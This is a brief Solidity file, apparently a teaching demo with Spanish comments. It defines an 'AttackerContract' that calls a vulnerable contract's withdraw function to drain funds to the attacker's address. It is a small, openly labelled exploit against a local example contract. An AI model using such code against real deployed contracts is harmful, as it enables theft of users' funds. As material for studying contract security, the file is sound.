// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract AttackerContract {
    VulnerableContract public vulnerable;

    constructor(address _vulnerableAddress) {
        vulnerable = VulnerableContract(_vulnerableAddress);
    }

    // Función para explotar la vulnerabilidad y retirar fondos
    function attack(uint _amount) public {
        // El atacante puede llamar a la función vulnerable `withdraw`
        vulnerable.withdraw(_amount);
        // Los fondos serán enviados a `msg.sender`, que es el atacante.
    }

    // Función para recibir fondos
    receive() external payable {}
}
